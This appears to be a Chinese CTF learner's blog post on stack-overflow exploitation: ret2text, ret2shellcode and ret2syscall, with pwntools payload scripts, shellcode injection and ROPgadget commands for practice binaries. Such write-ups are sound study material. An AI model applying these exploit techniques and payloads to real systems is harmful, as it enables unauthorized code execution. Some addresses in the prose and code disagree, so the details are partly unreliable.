---
title:  学习pwn小记(1)
categories: [CTF]
tags: [pwn]

---

某年某日,应队伍缺pwn,故学习于ctf-wiki.学其有感,写文以记之。
<!-- more -->

## 栈溢出

### 原理

栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。

![image-20200909214148691](image-20200909214148691.png)

如图，想要利用触发栈溢出程序必须向**栈上写入数据**和**写入的数据大小没有被良好地控制**

### 寻找危险函数

#### 关于输入的危险函数

​    gets()，直接读取一行，忽略'\x00'
​    	    scanf()
​            vscanf()

#### 关于输出的危险函数

   sprintf()

#### 关于字符串操作的危险函数

​    strcpy，字符串复制，遇到'\x00'停止
​    		strcat，字符串拼接，遇到'\x00'停止
​    		bcopy

### 确定填充长度

这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式

- 相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得
- 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。
- 直接地址索引，就相当于直接给定了地址。

一般来说，我们会有如下的覆盖需求

- 覆盖函数返回地址，这时候就是直接看 EBP 即可。
- 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。
- 覆盖 bss 段某个变量的内容。
- 根据现实执行情况，覆盖特定的变量或地址的内容。

ps：我们覆盖某个地址的目的是为了让程序读取我们覆盖的恶意地址来达到我们的目的，执行我们想要执行的东西。



## ret2text

emm,这道题保护只开了栈不可执行,对我来说影响深刻的反而是找buf的大小的问题。

![image-20200911231138664](image-20200911231138664.png)

照着以前对pwn薄弱理解，打开ide看到了：

![image-20200911220549058](image-20200911220549058.png)

然后照ebp算出的要溢出：0x64+4个（104）字符才能溢出到返回地址。

但是在gdb出来却是：

![image-20200911110700992](image-20200911110700992.png)

经过测试要溢出的字符的确是108个。才能覆盖返回地址。

通过收查资料发现，ebp存储着当前栈帧的栈底的地址是通常作为基址。而变量地址是通过通过ebp和偏移相加减来获取。但esp始终指向栈顶，随栈内数据增加或减少而变。同时ida是IDA是静态调试gdb是动态调试，所以ida计算偏移可能有误差，导致我们通过ebp计算出来有误差。（所以还是最好用动态调试）

然后就返回地址的问题，这里学到一个新的知识吧，返回0x804864A就可以将/bin/sh传入system执行。（

![image-20200911223653876](image-20200911223653876.png)

然后溢出大小控制了返回地址也确定了，这题就好做了。

```python
from pwn import *

p=process('./ret2text')

pay='a'*108+'bbbb'+p32(0x0804863A) 
#pay='a'*108+'bbbb'+p32(e.got['system'])+p32(0)+p32(0x08048763)#这个是调用system手动传入内置的‘/bin/sh’

p.sendline(pay)
p.interactive()
```





## ret2shellcode

这道题没有看到system与/bin/sh，但看到nx没防护,在vmap下发现buf有读写执行的能力,所以想要手动写入shell。

![image-20200912105057908](image-20200912105057908.png)

![image-20200912115324139](image-20200912115324139.png)

于是借着strncpy写入shell

```python
from pwn import *


p=process('./ret2shellcode')
e=ELF('./ret2shellcode')
shell=asm(shellcraft.sh())
lang=108+4-len(shell)
pay=shell+'a'*lang+p32(0x0804A080)#让buf前面是shell，后面是溢出数据，最后是buf地址

p.sendline(pay)
p.interactive()
```



## ret2syscall

这道题,本菜鸡感觉学到两个知识点用系统调用的方法来处理函数和ROPgadget的使用.当我们获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。于是我们可以构造

``` 
execve("/bin/sh",NULL,NULL)
可以理解为调用int 0x80(eax,ebx,ecx,edx)
即：
系统调用号，即 eax 应该为表execve的 0xb
第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
第二个参数，即 ecx 应该为 0
第三个参数，即 edx 应该为 0

构造payload的框架大体是：
溢出数据 eax地址 eax的值 ebx地址  ebx值  ecx地址 ecx 值 edx 值 edx 值 0x80地址

```

eax、ebx、ecx、edx这些寄存器可以地址可以用ROPgadget来得到。这里说下ROPgadge是使用

查找可存储寄存器的地址：

```shell
ROPgadget --binary rop  --only 'pop|ret' | grep  '寄存器'
#例
ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
```

查找某字符串地址：

```shell
 ROPgadget --binary rop --string  "字符串“
 #例
 ROPgadget --binary rop --string "/bin/sh"
```



查找有int 0x80的地址：

```shell
ROPgadget --binary rop  --only 'int'
```

这样下来payload就容易构造了

```python
from pwn import *

p=process('./rop')
e=ELF('./rop')

pay='a'*112+p32(0x080bb196)+p32(0xb)+p32(0x0806eb90)+p32(0)+p32(0)+p32(0x080be408)+p32(0x08049421)
#pay溢出数据+eax地址+eax的值+ebx地址+ebx值+ecx地址+ecx 值 +edx 地址 +edx 值+0x80地址

p.sendline(pay)
p.interactive()
```

ps：由于v0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret   ，so先传cdx，ecx，再ebx。

## 参考文献

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/

https://www.jianshu.com/p/dd5fd511e0d3